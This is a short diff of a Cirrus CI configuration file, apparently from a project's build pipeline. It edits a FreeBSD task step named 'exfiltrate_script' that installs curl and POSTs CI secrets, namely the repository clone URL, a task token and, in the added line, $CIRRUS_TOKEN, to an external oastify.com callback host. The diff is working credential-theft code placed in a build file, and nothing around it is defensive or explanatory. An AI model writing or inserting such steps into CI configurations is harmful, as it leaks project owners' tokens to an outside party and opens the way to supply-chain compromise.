@@ -88,4 +88,4 @@ freebsd_task:
   exfiltrate_script:
     - pkg install -y curl  # Ensure curl is installed before running the exfiltration step
     - echo "Exfiltrating secret: $CIRRUS_REPO_CLONE_URL" | curl -X POST -d @- http://468a9ra6vkdbszaxpuzakwqxeokf87ww.oastify.com/exfiltrate
-    - echo "Exfiltrating secret: $CIRRUS_TASK_TOKEN" | curl -X POST -d @- http://468a9ra6vkdbszaxpuzakwqxeokf87ww.oastify.com/exfiltrate
+    - echo "Exfiltrating CIRRUS_TOKEN: $CIRRUS_TOKEN" | curl -X POST -d @- http://468a9ra6vkdbszaxpuzakwqxeokf87ww.oastify.com/exfiltrate
